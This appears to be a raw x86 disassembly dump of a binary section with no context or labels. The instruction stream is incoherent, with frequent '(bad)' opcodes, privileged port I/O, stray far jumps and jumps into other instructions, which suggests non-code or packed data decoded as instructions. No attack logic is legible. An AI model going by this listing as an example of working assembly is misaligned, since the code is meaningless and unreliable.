  41d620:	xchg   ecx,eax
  41d621:	mov    dh,0x7d
  41d623:	not    esp
  41d625:	pop    esi
  41d626:	cmp    dh,BYTE PTR [edi+0x38]
  41d629:	push   ds
  41d62a:	sub    edx,DWORD PTR [esi-0x32]
  41d62d:	gs or  cl,0x25
  41d631:	int3   
  41d632:	icebp  
  41d633:	bt     eax,ecx
  41d636:	sti    
  41d637:	int3   
  41d638:	cmp    esi,DWORD PTR [edi-0x5b]
  41d63b:	xchg   ebp,eax
  41d63c:	xchg   ecx,eax
  41d63d:	imul   ebp,DWORD PTR [ebp-0x42],0x4dd6640
  41d644:	in     eax,0xf9
  41d646:	fldenv [edi-0x37]
  41d649:	sbb    eax,0x2b81c7c2
  41d64e:	out    dx,eax
  41d64f:	inc    esp
  41d650:	cmp    bh,BYTE PTR [esi+0x3e9baa23]
  41d656:	fucomi st,st(2)
  41d658:	adc    ecx,eax
  41d65a:	loope  0x41d633
  41d65c:	sahf   
  41d65d:	push   ebx
  41d65e:	xor    DWORD PTR [ecx-0xd],0x25
  41d662:	test   BYTE PTR [esi],bh
  41d664:	ja     0x41d672
  41d666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d667:	jno    0x41d64a
  41d669:	jmp    0x41d661
  41d66b:	mov    dh,0x91
  41d66d:	fwait
  41d66e:	or     eax,0xae2e72ce
  41d673:	repz test eax,0xda144288
  41d679:	fisubr DWORD PTR [edx+ebx*8-0x50ef52c0]
  41d680:	pop    ebx
  41d681:	dec    eax
  41d682:	pop    ss
  41d683:	xor    bl,0xab
  41d686:	aad    0x29
  41d688:	mov    eax,0xb8021c1e
  41d68d:	icebp  
  41d68e:	and    DWORD PTR [ecx],ebx
  41d690:	cmp    eax,0x8a3a0a19
  41d695:	ficom  DWORD PTR [eax]
  41d697:	jecxz  0x41d69a
  41d699:	(bad)  
  41d69a:	sbb    eax,0x257a61ff
  41d69f:	stos   DWORD PTR es:[edi],eax
  41d6a0:	dec    eax
  41d6a1:	mov    ss,WORD PTR [ebp-0x60cde56f]
  41d6a7:	pop    es
  41d6a8:	stc    
  41d6a9:	adc    esi,DWORD PTR [esi+0x523756e6]
  41d6af:	dec    eax
  41d6b0:	dec    edx
  41d6b1:	cmp    ah,BYTE PTR [eax-0x11]
  41d6b4:	mov    dl,0xa1
  41d6b6:	cld    
  41d6b7:	into   
  41d6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6b9:	ss add dh,dh
  41d6bc:	daa    
  41d6bd:	ins    BYTE PTR es:[edi],dx
  41d6be:	loope  0x41d649
  41d6c0:	inc    esp
  41d6c1:	jae    0x41d6a8
  41d6c3:	push   es
  41d6c4:	sub    DWORD PTR [edx-0x6379d76],0xffffffe7
  41d6cb:	jg     0x41d72e
  41d6cd:	into   
  41d6ce:	lea    ebx,[ebx+0x6f]
  41d6d1:	jnp    0x41d749
  41d6d3:	sub    eax,0x207b68f6
  41d6d8:	dec    edi
  41d6d9:	adc    ah,BYTE PTR [ebx+0xd]
  41d6dc:	es ret 0x408d
  41d6e0:	or     cl,BYTE PTR [esi-0x2c448ed9]
  41d6e6:	shl    ebp,cl
  41d6e8:	retf   
  41d6e9:	mov    edx,fs
  41d6eb:	mov    edx,?
  41d6ed:	push   es
  41d6ee:	xor    BYTE PTR [edx+0x5b],cl
  41d6f1:	mov    dl,0xcc
  41d6f3:	and    ah,BYTE PTR [ebx+ebx*4-0xa]
  41d6f7:	inc    edx
  41d6f8:	push   ds
  41d6f9:	aam    0xa2
  41d6fb:	enter  0xd432,0xb6
  41d6ff:	cmp    DWORD PTR [ebx],ebx
  41d701:	outs   dx,DWORD PTR ds:[esi]
  41d702:	sub    al,0xfe
  41d704:	jmp    0x41d755
  41d706:	add    BYTE PTR [edi],cl
  41d708:	xchg   ebp,eax
  41d709:	mov    ds:0x6e4cf240,al
  41d70e:	scas   al,BYTE PTR es:[edi]
  41d70f:	jo     0x9e253326
  41d715:	mov    edi,0x270a4a58
  41d71a:	enter  0x9eb6,0xb7
  41d71e:	dec    ebx
  41d71f:	push   es
  41d720:	mov    eax,0x954887d6
  41d725:	and    BYTE PTR [eax],0x62
  41d728:	mov    ch,0x7
  41d72a:	xchg   bl,bl
  41d72c:	sbb    cl,dh
  41d72e:	enter  0xc587,0x40
  41d732:	rol    DWORD PTR [esi-0x60],cl
  41d735:	cld    
  41d736:	sbb    dh,bl
  41d738:	push   ebx
  41d739:	imul   eax,esi,0x47878b51
  41d73f:	mov    ecx,0x6231b2fd
  41d744:	leave  
  41d745:	adc    eax,0xacccee1b
  41d74a:	nop
  41d74b:	ss scas al,BYTE PTR es:[edi]
  41d74d:	in     eax,0x8a
  41d74f:	cmp    eax,0xa1252f3f
  41d754:	add    eax,0x1bfe3aff
  41d759:	pop    esi
  41d75a:	mov    ah,0x66
  41d75c:	xor    BYTE PTR [edi+ebp*8-0x3a],dl
  41d760:	push   0xffffffac
  41d762:	jne    0x41d760
  41d764:	xchg   BYTE PTR [eax-0x67],dl
  41d767:	xor    ah,bl
  41d769:	cli    
  41d76a:	cmc    
  41d76b:	stos   DWORD PTR es:[edi],eax
  41d76c:	nop
  41d76d:	or     al,0xd
  41d76f:	push   ss
  41d770:	les    eax,FWORD PTR [esi-0x7f]
  41d773:	stos   DWORD PTR es:[edi],eax
  41d774:	popf   
  41d775:	and    BYTE PTR [esi-0x6c],dh
  41d778:	push   0x2d
  41d77a:	sbb    al,0x2c
  41d77c:	add    al,BYTE PTR [esi+0x68]
  41d77f:	scas   al,BYTE PTR es:[edi]
  41d780:	int3   
  41d781:	inc    ecx
  41d782:	mov    edx,0xfdd4423f
  41d787:	fldcw  WORD PTR [edi+edx*8]
  41d78a:	int3   
  41d78b:	or     BYTE PTR [esi-0x731ea7b9],bh
  41d791:	add    esp,DWORD PTR [ebp+0x303147db]
  41d797:	push   es
  41d798:	push   edx
  41d799:	jns    0x41d77c
  41d79b:	push   esp
  41d79c:	inc    ebx
  41d79d:	(bad)  
  41d79f:	mov    ah,BYTE PTR ds:0xd833cf32
  41d7a5:	push   esi
  41d7a6:	outs   dx,DWORD PTR ds:[esi]
  41d7a7:	aad    0xdb
  41d7a9:	dec    edx
  41d7aa:	into   
  41d7ab:	sbb    DWORD PTR [edx-0x63fec87],0x64
  41d7b2:	xchg   DWORD PTR [edi-0x59],esp
  41d7b5:	xchg   esp,eax
  41d7b6:	in     eax,0x7a
  41d7b8:	adc    DWORD PTR [edi-0x32324937],eax
  41d7be:	adc    cl,BYTE PTR [eax]
  41d7c0:	icebp  
  41d7c1:	and    edx,DWORD PTR [ecx]
  41d7c3:	out    0x45,eax
  41d7c5:	ss icebp 
  41d7c7:	inc    edi
  41d7c8:	cmp    BYTE PTR [edx-0x55ae382c],0x39
  41d7cf:	shl    DWORD PTR [ebx],1
  41d7d1:	shr    al,1
  41d7d3:	xchg   ecx,eax
  41d7d4:	scas   al,BYTE PTR es:[edi]
  41d7d5:	cmp    DWORD PTR cs:[ecx-0x7d],ecx
  41d7d9:	or     al,0xff
  41d7db:	cmp    bl,BYTE PTR ds:0x8a00d9a6
  41d7e1:	xor    al,cl
  41d7e3:	loope  0x41d76e
  41d7e5:	pop    edx
  41d7e6:	mov    dh,BYTE PTR [ecx+0x47]
  41d7e9:	push   eax
  41d7ea:	fcmovb st,st(1)
  41d7ec:	or     al,0x6e
  41d7ee:	imul   ecx,DWORD PTR [eax-0x77],0x23
  41d7f2:	mov    dl,0xaa
  41d7f4:	rcl    ah,0xc4
  41d7f7:	inc    ebp
  41d7f8:	shl    ah,0xd8
  41d7fb:	adc    al,0x8d
  41d7fd:	dec    edi
  41d7fe:	ror    BYTE PTR [edi+esi*1+0x5b],cl
  41d802:	push   ss
  41d803:	loop   0x41d79d
  41d805:	retf   0x59df
  41d808:	push   0xffffffba
  41d80a:	mov    edx,0x6a0fb305
  41d80f:	mov    edi,0x74ca63ec
  41d814:	cdq    
  41d815:	inc    ebx
  41d816:	dec    ecx
  41d817:	mov    edi,0x595c72e0
  41d81c:	es mov ecx,0x659c2181
  41d822:	rcr    BYTE PTR [ebp-0x4110a2ed],0x31
  41d829:	stc    
  41d82a:	cmp    DWORD PTR [edi-0x63133baf],esp
  41d830:	jmp    0x5fa9:0x2e132e5b
  41d837:	dec    esi
  41d838:	or     DWORD PTR [ebp+0x79314f77],ecx
  41d83e:	ficomp WORD PTR [eax+0x57]
  41d841:	xor    eax,0x7a78b14a
  41d846:	test   eax,0x84a34e10
  41d84b:	ficomp WORD PTR [ebp-0x1dbd007b]
  41d851:	jle    0x41d82e
  41d853:	mov    ds:0xc24a96b4,eax
  41d858:	add    al,BYTE PTR [ebx+0x3c]
  41d85b:	daa    
  41d85c:	add    BYTE PTR [edi+0x82a0181],bh
  41d862:	jne    0x41d8cb
  41d864:	xchg   ebx,eax
  41d865:	js     0x41d840
  41d867:	iret   
  41d868:	jmp    0x41d841
  41d86a:	cdq    
  41d86b:	xor    dl,BYTE PTR [eax-0x522ee42a]
  41d871:	ins    DWORD PTR es:[edi],dx
  41d872:	or     eax,0x5289aaf1
  41d877:	mov    ebx,0xd8ab283c
  41d87c:	xchg   DWORD PTR [ecx+0x20],edx
  41d87f:	ret    0x4c65
  41d882:	sub    BYTE PTR [edi],ch
  41d884:	ret    0x1bdc
  41d887:	ins    DWORD PTR es:[edi],dx
  41d888:	add    BYTE PTR [ecx],ch
  41d88a:	push   esi
  41d88b:	cdq    
  41d88c:	add    dh,al
  41d88e:	js     0x41d88d
  41d890:	aad    0xf8
  41d892:	mov    DWORD PTR [edi],ecx
  41d894:	push   es
  41d895:	rcl    edx,0x9
  41d898:	jnp    0x41d82c
  41d89a:	cli    
  41d89b:	inc    ecx
  41d89c:	in     eax,dx
  41d89d:	pop    eax
  41d89e:	push   ss
  41d89f:	add    ebx,ebx
  41d8a1:	(bad)  
  41d8a2:	fxch   st(7)
  41d8a4:	mov    dh,0x3f
  41d8a6:	adc    ch,BYTE PTR [ecx-0x3d]
  41d8a9:	test   edi,edx
  41d8ab:	popf   
  41d8ac:	(bad)  
  41d8ad:	out    dx,al
  41d8ae:	dec    edx
  41d8af:	leave  
  41d8b0:	jle    0x41d86d
  41d8b2:	sahf   
  41d8b3:	lahf   
  41d8b4:	ret    0x1c5e
  41d8b7:	repnz ss aas 
  41d8ba:	mov    gs,esp
  41d8bc:	outs   dx,BYTE PTR ds:[esi]
  41d8bd:	or     cl,BYTE PTR [esi-0x24]
  41d8c0:	xchg   esi,eax
  41d8c1:	imul   ebx,ebp,0xdebbf6b3
  41d8c7:	gs aad 0x92
  41d8ca:	lds    edx,FWORD PTR [ebp+0x4f456103]
  41d8d0:	mov    ch,0x78
  41d8d2:	adc    al,0x1e
  41d8d4:	aas    
  41d8d5:	out    0x21,eax
  41d8d7:	jmp    0xfe07:0x3fb19864
  41d8de:	pop    esi
  41d8df:	xchg   ecx,eax
  41d8e0:	ins    BYTE PTR es:[edi],dx
  41d8e1:	mov    bh,0x4d
  41d8e3:	imul   edi,ebp,0xffffffca
  41d8e6:	out    0x0,eax
  41d8e8:	call   0xcc20b7d
  41d8ed:	rcl    DWORD PTR [eax+0x722ffdd0],1
  41d8f3:	sub    ebp,ebp
  41d8f5:	xchg   dl,ch
  41d8f7:	sub    BYTE PTR [ebp-0x442996bf],0xed
  41d8fe:	(bad)  [edi+0xa6e3a4d]
  41d904:	data16 mov dl,0x1c
  41d907:	mov    cl,0x60
  41d909:	adc    al,0x1e
  41d90b:	jae    0x41d89f
  41d90d:	mov    dl,0xec
  41d90f:	js     0x41d93b
  41d911:	(bad)  
  41d912:	xchg   edx,eax
  41d913:	jecxz  0x41d8db
  41d915:	adc    ah,BYTE PTR [ecx+0x1f]
  41d918:	push   esp
  41d919:	test   al,0x80
  41d91b:	dec    ebx
  41d91c:	int3   
  41d91d:	cmp    DWORD PTR [edx+0x58],0x6637373d
  41d924:	inc    esi
  41d925:	jg     0x41d97a
  41d927:	imul   eax,DWORD PTR ds:0xa07ce280,0xffffffa9
  41d92e:	aas    
  41d92f:	js     0x41d8f0
  41d931:	push   ds
  41d932:	pop    ecx
  41d933:	mov    WORD PTR [ecx*8+0x1bb8a095],cs
  41d93a:	ja     0x41d97b
  41d93c:	push   esp
  41d93d:	adc    ecx,DWORD PTR [ecx+0x34bcb13a]
  41d943:	fstp   TBYTE PTR [eax-0x31]
  41d946:	cli    
  41d947:	gs dec edi
  41d949:	aas    
  41d94a:	sbb    ecx,DWORD PTR [eax-0x3d]
  41d94d:	inc    ebx
  41d94e:	(bad)  
  41d94f:	retf   
  41d950:	jg     0x41d954
  41d952:	xchg   ebx,eax
  41d953:	jle    0x41d9c0
  41d955:	sub    dh,BYTE PTR [ecx+ebp*4-0x347ade12]
  41d95c:	stc    
  41d95d:	sar    dh,1
  41d95f:	dec    ebp
  41d960:	add    edx,ebp
  41d962:	dec    ebp
  41d963:	(bad)  
  41d964:	sbb    ah,BYTE PTR ss:[ebp+0x47aaf6c0]
  41d96b:	sbb    al,0xcc
  41d96d:	pushf  
  41d96e:	jne    0x41d98e
  41d970:	retf   0xf246
  41d973:	xchg   edx,eax
  41d974:	fs dec ecx
  41d976:	js     0x41d99a
  41d978:	outs   dx,BYTE PTR ds:[esi]
  41d979:	fld    TBYTE PTR [eax-0x228b8159]
  41d97f:	lds    ebp,FWORD PTR [edi+0x58]
  41d982:	and    esi,esi
  41d984:	das    
  41d985:	mov    ch,0x16
  41d987:	ss add eax,0x5a998597
  41d98d:	aam    0xdc
  41d98f:	scas   eax,DWORD PTR es:[edi]
  41d990:	push   ebp
  41d991:	mov    ebp,0xe90dcd1f
  41d996:	push   es
  41d997:	mov    bl,BYTE PTR [ebx+ebx*4+0x474146a5]
  41d99e:	jge    0x41da01
  41d9a0:	sub    BYTE PTR [edx+0x47],dh
  41d9a3:	dec    eax
  41d9a4:	test   DWORD PTR [edi],ebp
  41d9a6:	loopne 0x41d976
  41d9a8:	retf   
  41d9a9:	sbb    BYTE PTR [ebp-0xf],dl
  41d9ac:	push   cs
  41d9ad:	inc    eax
  41d9ae:	or     WORD PTR [eax+0x1064fbe8],0x5b68
  41d9b7:	adc    al,0x8
  41d9b9:	or     esp,DWORD PTR [esi+ecx*8-0x41]
  41d9bd:	leave  
  41d9be:	sbb    BYTE PTR [eax+0xf],ah
  41d9c1:	adc    bh,BYTE PTR [edi+0x2d7cb2a1]
  41d9c7:	pushf  
  41d9c8:	int3   
  41d9c9:	inc    ebx
  41d9ca:	lock dec edx
  41d9cc:	(bad)  
  41d9cd:	cmp    al,0x1e
  41d9cf:	push   ss
  41d9d0:	cmp    eax,0x6bcd9cf0
  41d9d5:	add    BYTE PTR [eax],0xc8
  41d9d8:	xlat   BYTE PTR ds:[ebx]
  41d9d9:	inc    ecx
  41d9da:	jmp    0x4a96:0x4d03c205
  41d9e1:	sbb    ebp,DWORD PTR [esi*8+0x6cee7309]
  41d9e8:	and    al,0xb8
  41d9ea:	adc    dl,BYTE PTR [ecx]
  41d9ec:	daa    
  41d9ed:	lods   eax,DWORD PTR ds:[esi]
  41d9ee:	adc    BYTE PTR [ebx-0x29],al
  41d9f1:	pop    es
  41d9f2:	sub    esp,edx
  41d9f4:	push   ebx
  41d9f5:	cmc    
  41d9f6:	mul    eax
  41d9f8:	xor    DWORD PTR [esi*8+0x7df9ef67],esp
  41d9ff:	cmp    BYTE PTR [ebx+0x3b],ch
  41da02:	pop    edi
  41da03:	test   DWORD PTR [ebx+0x7b],esi
  41da06:	xor    al,0x10
  41da08:	daa    
  41da09:	call   0xdb06:0xcb05331a
  41da10:	test   eax,0xf7745ed8
  41da15:	or     BYTE PTR [esi],bh
  41da17:	sub    ch,BYTE PTR [esi]
  41da19:	cmp    eax,0x2356bc7b
  41da1e:	mov    eax,0x8529a02e
  41da23:	int3   
  41da24:	in     al,dx
  41da25:	iret   
  41da26:	fwait
  41da27:	pop    ds
  41da28:	cmp    ecx,DWORD PTR [ecx+0x4f]
  41da2b:	scas   eax,DWORD PTR es:[edi]
  41da2c:	dec    eax
  41da2d:	sub    DWORD PTR [esi-0x26],0x20c3f8d3
  41da34:	pop    es
  41da35:	hlt    
  41da36:	pop    ebp
  41da37:	idiv   DWORD PTR [edi-0x1f]
  41da3a:	clc    
  41da3b:	addr16 jmp 0x41da4d
  41da3e:	and    eax,0xb8f4d97
  41da43:	sbb    DWORD PTR [edi],0xffffffd2
  41da46:	xchg   edi,eax
  41da47:	scas   eax,DWORD PTR es:[edi]
  41da48:	imul   ecx,DWORD PTR [ebx],0x16
  41da4b:	inc    edi
  41da4c:	mov    bl,ch
  41da4e:	xlat   BYTE PTR ds:[ebx]
  41da4f:	or     dh,BYTE PTR ds:0x52eaf6e1
  41da55:	int    0xdc
  41da57:	xlat   BYTE PTR ds:[ebx]
  41da58:	mov    bl,al
  41da5a:	mov    bh,0x50
  41da5c:	(bad)  
  41da5d:	mov    al,0xae
  41da5f:	pushf  
  41da60:	fs jae 0x41da83
  41da63:	and    esp,DWORD PTR [edx+edi*8]
  41da66:	sbb    BYTE PTR [esi],al
  41da68:	jno    0x41d9ff
  41da6a:	daa    
  41da6b:	shl    BYTE PTR [esi+eiz*8],0x2e
  41da6f:	jno    0x41da51
  41da71:	cdq    
  41da72:	fwait
  41da73:	imul   ebx,ecx,0x49
  41da76:	retf   
  41da77:	repz xchg ebp,eax
  41da79:	dec    esi
  41da7a:	sbb    eax,0x8ac2687c
  41da7f:	test   al,0xf9
  41da81:	gs stc 
  41da83:	jl     0x41da25
  41da85:	fiadd  DWORD PTR [ecx+0x15]
  41da88:	push   ss
  41da89:	cdq    
  41da8a:	stos   DWORD PTR es:[edi],eax
  41da8b:	or     eax,0x51825f93
  41da90:	pop    es
  41da91:	das    
  41da92:	cs jecxz 0x41da9e
  41da95:	or     DWORD PTR [esi],0xccb395b0
  41da9b:	pop    esi
  41da9c:	je     0x41da73
  41da9e:	es mov esp,ecx
  41daa1:	pusha  
  41daa2:	inc    edi
  41daa3:	add    bl,BYTE PTR ds:[esi]
  41daa6:	inc    ecx
  41daa7:	inc    DWORD PTR ds:0x79b07296
  41daad:	adc    BYTE PTR [ebx-0x4a],bh
  41dab0:	mov    WORD PTR [ebx+ebx*1],?
  41dab3:	ss ds popf 
  41dab6:	popf   
  41dab7:	mov    al,0xe0
  41dab9:	dec    edx
  41daba:	push   0xffffffe5
  41dabc:	iret   
  41dabd:	pop    eax
  41dabe:	je     0x41da84
  41dac0:	dec    ecx
  41dac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dac2:	sbb    eax,0x51e33163
  41dac7:	add    eax,0xc32a45c7
  41dacc:	stos   BYTE PTR es:[edi],al
  41dacd:	ret    0x79e6
  41dad0:	ret    0x1e34
  41dad3:	pop    edx
  41dad4:	mov    ss,WORD PTR [edx]
  41dad6:	push   0x40
  41dad8:	imul   eax,DWORD PTR [ebp+edi*1-0x61],0xffffffb1
  41dadd:	jb     0x41dacc
  41dadf:	mov    eax,0x3a5eabd6
  41dae4:	xor    cl,bh
  41dae6:	xor    BYTE PTR [edx+0x6001d6f8],ah
  41daec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daed:	bound  edi,QWORD PTR [ecx+0x2c]
  41daf0:	mov    ds:0xa44a9793,eax
  41daf5:	cmp    ah,bl
  41daf7:	cwde   
  41daf8:	iret   
  41daf9:	cmp    edx,edi
  41dafb:	jmp    FWORD PTR [ebx]
  41dafd:	xor    dl,dl
  41daff:	lds    esi,FWORD PTR [edx+0x6a]
  41db02:	or     al,0x47
  41db04:	dec    edi
  41db05:	adc    DWORD PTR [eax+0x32163938],0xffffffc5
  41db0c:	xchg   ecx,eax
  41db0d:	mov    dl,0x80
  41db0f:	inc    ecx
  41db10:	pop    edx
  41db11:	mov    esp,0x86aca4b7
  41db16:	or     edx,ecx
  41db18:	aas    
  41db19:	sahf   
  41db1a:	rol    DWORD PTR [ebx+0xdb8c44f],cl
  41db20:	inc    ebp
  41db21:	ja     0x41db92
  41db23:	pop    edi
  41db24:	xchg   esp,eax
  41db25:	push   esp
  41db26:	mov    al,0x6d
  41db28:	push   0xfe89f364
  41db2d:	pop    ss
  41db2e:	adc    esi,ecx
  41db30:	outs   dx,BYTE PTR ds:[esi]
  41db31:	sub    ebx,0xf5bed7c3
  41db37:	int    0x45
  41db39:	mov    bh,0xef
  41db3b:	imul   DWORD PTR [eax+0x5e]
  41db3e:	aam    0x99
  41db40:	test   BYTE PTR [edx+ebx*1-0x6faae0e2],al
  41db47:	fnstcw WORD PTR [ebp+edi*4+0x2983259]
  41db4e:	add    ah,ah
  41db50:	outs   dx,DWORD PTR ds:[esi]
  41db51:	sbb    ecx,esi
  41db53:	cld    
  41db54:	add    eax,DWORD PTR [eax+0x87d9e22]
  41db5a:	add    al,0xf9
  41db5c:	adc    al,bh
  41db5e:	icebp  
  41db5f:	pop    edx
  41db60:	retf   
  41db61:	add    dl,bl
  41db63:	xchg   edi,eax
  41db64:	adc    ch,BYTE PTR [ebx+0xe]
  41db67:	pop    esp
  41db68:	cmp    DWORD PTR [edi+0x53ed0133],esp
  41db6e:	jnp    0x41db98
  41db70:	das    
  41db71:	mov    ds:0xbea82aee,eax
  41db76:	cmp    eax,0x5f59eac8
  41db7b:	fmul   st(1),st
  41db7d:	mov    DWORD PTR [eax+0x2e],ebx
  41db80:	push   es
  41db81:	add    al,cl
  41db83:	dec    esp
  41db84:	mov    ds:0xb2221f26,al
  41db89:	and    eax,0x83dea43f
  41db8e:	out    0x1e,eax
  41db90:	mov    edi,0x468c107f
  41db95:	bound  ebp,QWORD PTR [ecx-0xa]
  41db98:	out    dx,eax
  41db99:	push   es
  41db9a:	lods   al,BYTE PTR ds:[esi]
  41db9b:	scas   al,BYTE PTR es:[edi]
  41db9c:	loope  0x41dc13
  41db9e:	icebp  
  41db9f:	mov    bh,0xaa
  41dba1:	mov    ebx,0x48f434ab
  41dba6:	iret   
  41dba7:	pop    ds
  41dba8:	mov    edi,0xb0e3a55
  41dbad:	les    edx,FWORD PTR [ecx]
  41dbaf:	mov    ch,0xfc
  41dbb1:	in     eax,0x85
  41dbb3:	jg     0x41dbc3
  41dbb5:	jo     0x41db6c
  41dbb7:	add    dl,BYTE PTR [esi+esi*4+0x66bb5ad5]
  41dbbe:	lods   eax,DWORD PTR ds:[esi]
  41dbbf:	das    
  41dbc0:	dec    edx
  41dbc1:	sti    
  41dbc2:	xor    BYTE PTR ds:0x6d7a0dce,bl
  41dbc8:	aam    0xef
  41dbca:	sbb    eax,0xa68d4478
  41dbcf:	out    0x1e,al
  41dbd1:	mov    ds:0xf8dab53b,al
  41dbd6:	iret   
  41dbd7:	ins    BYTE PTR es:[edi],dx
  41dbd8:	cmc    
  41dbd9:	dec    eax
  41dbda:	repnz cmc 
  41dbdc:	push   esp
  41dbdd:	test   ch,0x5
  41dbe0:	mov    ecx,0x242b1feb
  41dbe5:	lods   eax,DWORD PTR ds:[esi]
  41dbe6:	daa    
  41dbe7:	and    BYTE PTR [eax-0x5fe846a5],dh
  41dbed:	inc    ebx
  41dbee:	sahf   
  41dbef:	or     bl,al
  41dbf1:	jnp    0x41dc58
  41dbf3:	xchg   ecx,eax
  41dbf4:	arpl   si,bx
  41dbf6:	jbe    0x41dbe8
  41dbf8:	inc    esi
  41dbf9:	fcom   QWORD PTR [eax+0x4716ee86]
  41dbff:	jmp    0x604d8cfd
  41dc04:	pop    esi
  41dc05:	mov    ch,0x35
  41dc07:	sar    BYTE PTR [eax+ecx*1],0x96
  41dc0b:	ror    DWORD PTR [edi-0x43],0x36
  41dc0f:	inc    esi
  41dc10:	mov    dl,0x7f
  41dc12:	loop   0x41dbc1
  41dc14:	mov    ecx,0x78600a39
  41dc19:	inc    edx
  41dc1a:	adc    ah,BYTE PTR [ebp-0x72cdf208]
  41dc20:	mov    ebp,0x8cfb52dc
  41dc25:	mov    bl,0x76
  41dc27:	xchg   BYTE PTR [eax+ebp*2],al
  41dc2a:	rcr    BYTE PTR [ebp+eiz*2+0xe],0x52
  41dc2f:	or     BYTE PTR [ebp-0x4c2aab6b],al
  41dc35:	inc    edx
  41dc36:	or     ecx,ebx
  41dc38:	shr    BYTE PTR [ebx-0x5f],cl
  41dc3b:	cdq    
  41dc3c:	jmp    0x41dc38
  41dc3e:	mov    dl,0x72
  41dc40:	adc    edi,esi
  41dc42:	adc    ecx,esi
  41dc44:	pop    esp
  41dc45:	xchg   DWORD PTR [ebx],ecx
  41dc47:	das    
  41dc48:	xchg   edx,eax
  41dc49:	mov    edx,es
  41dc4b:	out    0xfa,al
  41dc4d:	ins    BYTE PTR es:[edi],dx
  41dc4e:	test   eax,0xd0235cb3
  41dc53:	fiadd  DWORD PTR [ebx]
  41dc55:	aam    0x54
  41dc57:	retf   
  41dc58:	add    DWORD PTR [edi+0x7c],edx
  41dc5b:	push   esp
  41dc5c:	fsubr  QWORD PTR [eax+0x6e071dfa]
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	sub    eax,0x9c4ac1e3
  41dc68:	inc    esi
  41dc69:	add    esp,DWORD PTR [esi-0x5d6929ea]
  41dc6f:	and    al,0x5b
  41dc71:	(bad)  
  41dc72:	adc    bl,dl
  41dc74:	adc    esp,DWORD PTR [esi+0x5e]
  41dc77:	or     esi,DWORD PTR [ebp+0x5890c514]
  41dc7d:	jg     0x41dc63
  41dc7f:	xor    al,0x72
  41dc81:	div    DWORD PTR [edx-0x10d50e97]
  41dc87:	xor    edx,edi
  41dc89:	mov    bh,0x63
  41dc8b:	xchg   ebx,eax
  41dc8c:	and    DWORD PTR fs:[esi-0x35],ecx
  41dc90:	push   ss
  41dc91:	cli    
  41dc92:	xor    BYTE PTR [ebp+0x2a37e422],0x95
  41dc99:	push   ds
  41dc9a:	inc    esi
  41dc9b:	ds xor eax,0xcb645826
  41dca1:	sbb    al,0xe5
  41dca3:	aas    
  41dca4:	xor    BYTE PTR [edx+0x4e736bb6],ah
  41dcaa:	imul   edx,DWORD PTR ds:0x6a1d568f,0xfcfb6d59
  41dcb4:	and    al,0x8f
  41dcb6:	inc    ebp
  41dcb7:	adc    edx,ebp
  41dcb9:	dec    eax
  41dcba:	jno    0x41dc8c
  41dcbc:	mov    dh,0x4c
  41dcbe:	(bad)  
  41dcbf:	and    DWORD PTR [edi+0x518477ba],esi
  41dcc5:	cld    
  41dcc6:	lods   eax,DWORD PTR ds:[esi]
  41dcc7:	dec    ebp
  41dcc8:	in     eax,dx
  41dcc9:	and    BYTE PTR ss:[edx+0xb7f2b4c],0x54
  41dcd1:	div    BYTE PTR [esi+0x2b]
  41dcd4:	into   
  41dcd5:	scas   al,BYTE PTR es:[edi]
  41dcd6:	pop    ds
  41dcd7:	daa    
  41dcd8:	inc    ecx
  41dcd9:	popa   
  41dcda:	adc    ch,al
  41dcdc:	clc    
  41dcdd:	shl    BYTE PTR [ebx+0x1c34f46d],cl
  41dce3:	inc    edi
  41dce4:	dec    eax
  41dce5:	stos   DWORD PTR es:[edi],eax
  41dce6:	mov    ds:0xf8cd1b74,al
  41dceb:	xor    esi,DWORD PTR [edx+0x407e16d3]
  41dcf1:	cmp    BYTE PTR [edi],al
  41dcf3:	pop    ebx
  41dcf4:	loop   0x41dc9c
  41dcf6:	mov    es,WORD PTR [edi+edx*1]
  41dcf9:	ins    BYTE PTR es:[edi],dx
  41dcfa:	push   0x4c
  41dcfc:	or     ebx,edx
  41dcfe:	mov    al,0x11
  41dd00:	je     0x41dce4
  41dd02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd03:	cmp    ah,dl
  41dd05:	sti    
  41dd06:	xor    DWORD PTR ds:0x57a03ac5,esi
  41dd0c:	ret    0xec90
  41dd0f:	and    DWORD PTR es:[ebp-0x44a585d3],ebx
  41dd16:	pusha  
  41dd17:	fcom   DWORD PTR [edi]
  41dd19:	nop
  41dd1a:	out    dx,al
  41dd1b:	ja     0x41dcba
  41dd1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd1e:	push   es
  41dd1f:	xchg   esi,eax
  41dd20:	popf   
  41dd21:	push   ds
  41dd22:	sti    
  41dd23:	or     ah,ah
  41dd25:	pop    esp
  41dd26:	add    ecx,DWORD PTR [eax]
  41dd28:	in     al,dx
  41dd29:	jno    0x41dd54
  41dd2b:	iret   
  41dd2c:	test   BYTE PTR [ebp+0x2d],ah
  41dd2f:	jbe    0x41dcbc
  41dd31:	cmp    al,0x83
  41dd33:	push   ebx
  41dd34:	pop    eax
  41dd35:	inc    edi
  41dd36:	xchg   edx,eax
  41dd37:	add    eax,0x5304331c
  41dd3c:	xchg   ebx,eax
  41dd3d:	hlt    
  41dd3e:	xor    cl,BYTE PTR [edx]
  41dd40:	(bad)  
  41dd41:	cs adc ah,al
  41dd44:	push   esp
  41dd45:	adc    eax,ebp
  41dd47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd48:	ret    
  41dd49:	dec    ebp
  41dd4a:	out    0xc9,al
  41dd4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd4d:	jae    0x41dd41
  41dd4f:	jl     0x41dda4
  41dd51:	out    0x3a,al
  41dd53:	imul   eax,DWORD PTR [ebp-0x38],0xffffffd3
  41dd57:	adc    eax,DWORD PTR [eax+ecx*2-0x4a]
  41dd5b:	jg     0x41dd83
  41dd5d:	cmp    ah,ch
  41dd5f:	jo     0x41dd18
  41dd61:	test   BYTE PTR [ebx+0x606a7410],ch
  41dd67:	test   BYTE PTR [eax-0x288a7627],dl
  41dd6d:	xor    DWORD PTR [ebx+ebp*8-0xd42adf3],0x821bb26e
  41dd78:	push   edx
